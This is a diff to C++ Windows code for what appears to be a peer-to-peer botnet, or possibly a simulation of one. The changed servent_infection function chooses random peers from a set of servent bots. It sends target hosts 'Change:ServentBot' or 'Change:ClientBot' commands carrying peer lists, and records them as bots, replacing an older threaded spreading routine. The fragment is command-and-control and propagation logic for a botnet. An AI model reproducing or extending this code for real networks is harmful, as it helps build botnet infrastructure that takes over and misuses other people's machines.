@@ -1034,8 +1034,7 @@ int handle_msg(_socket *client, string msg_data) {
 int servent_infection(bool *console) {
     int random_num, delay;
     set<HOST *, HOSTPtrComp>::iterator host_i;
-    vector<HOST *> target_list;
-    vector<_socket *> client_list;
+    set<HOST *, HOSTPtrComp> random_list;
     HOST *target = NULL;
     string send_data, recv_data;
     if (host_set.size() > GROWT && host_set.size() > GROWNUM) {
@@ -1048,17 +1047,53 @@ int servent_infection(bool *console) {
             delay = delay_choose();
             if (delay == 0) {
                 send_data = "Change:ServentBot";
+                set<HOST *, HOSTPtrComp> my_list(servent_bot_set.begin(), servent_bot_set.end());
+                set<HOST *, HOSTPtrComp>::iterator it_find = my_list.find(target);
+                if (it_find != my_list.end() && it_find != my_list.end()) {
+                    my_list.erase(my_list.find(target));
+                }
+                set<HOST *, HOSTPtrComp>::iterator bot_i;
+                while (random_list.size() < PLSIZE) {
+                    random_num = (rand() * rand()) % my_list.size();
+                    bot_i = my_list.begin();
+                    advance(bot_i, random_num);
+                    random_list.insert(*bot_i);
+                    my_list.erase(bot_i);
+                }
+                for (auto host : random_list) {
+                    send_data += ":" + host->ip + ":" + host->port;
+                }
+                if (show_debug_msg) {
+                    printf("[INFO] Sending PeerList...(%s)\n", send_data.c_str());
+                }
+
             } else {
                 send_data = "Change:ClientBot";
+
+                set<HOST *, HOSTPtrComp>::iterator servent_i;
+                while (random_list.size() < (servent_bot_set.size() > ServentPerClient ? ServentPerClient
+                                                                                       : servent_bot_set.size())) {
+                    random_num = (rand() * rand()) % servent_bot_set.size();
+                    servent_i = servent_bot_set.begin();
+                    advance(servent_i, random_num);
+                    random_list.insert(*servent_i);
+                }
+
+                for (auto host : random_list) {
+                    send_data += ":" + host->ip + ":" + host->port;
+                }
+                if (show_debug_msg) {
+                    printf("[INFO] Sending ServentList...(%s)\n", send_data.c_str());
+                }
+
             }
             _socket *client = new _socket((char *) ((target->ip).c_str()), (char *) ((target->port).c_str()), BUFSIZE);
             if (client->get_status()) {
                 if (client->send_((char *) send_data.c_str()) == -1) {
                     printf("[Warning] HOST %s:%s Change Bot Failed.\n", (target->ip).c_str(), (target->port).c_str());
-                    delete client;
                 } else {
-                    client_list.push_back(client);
-                    target_list.push_back(target);
+                    client->shutdown_(_socket::BOTH);
+                    client->close_();
                     WaitForSingleObject(data_lock, INFINITE);
                     bot_set.insert(target);
                     if (delay == 0)
@@ -1069,28 +1104,9 @@ int servent_infection(bool *console) {
                 }
             } else {
                 printf("[Warning] HOST %s:%s Change Bot Failed.\n", (target->ip).c_str(), (target->port).c_str());
-                delete client;
             }
-        }
-
-        vector<HOST *>::iterator target_i;
-        vector<_socket *>::iterator client_i;
-        vector<HANDLE> handle;
-        vector<DWORD> tid;
-
-        for (target_i = target_list.begin(), client_i = client_list.begin();
-             target_i != target_list.end() && client_i != client_list.end() && *console;
-             target_list.erase(target_i), client_list.erase(client_i)) {
-            DWORD temp;
-            HANDLE t = CreateThread(NULL, 0, handle_bot_spreading,
-                                    (LPVOID) new pair<_socket *, HOST *>(*client_i, *target_i), 0, &temp);
-            handle.push_back(t);
-            tid.push_back(temp);
-            Sleep(5);
-        }
-        WaitForMultipleObjects((DWORD) handle.size(), &handle[0], true, INFINITE);
-        for (auto i : handle) {
-            CloseHandle(i);
+            delete client;
+            random_list.clear();
         }
     }
     return 1;
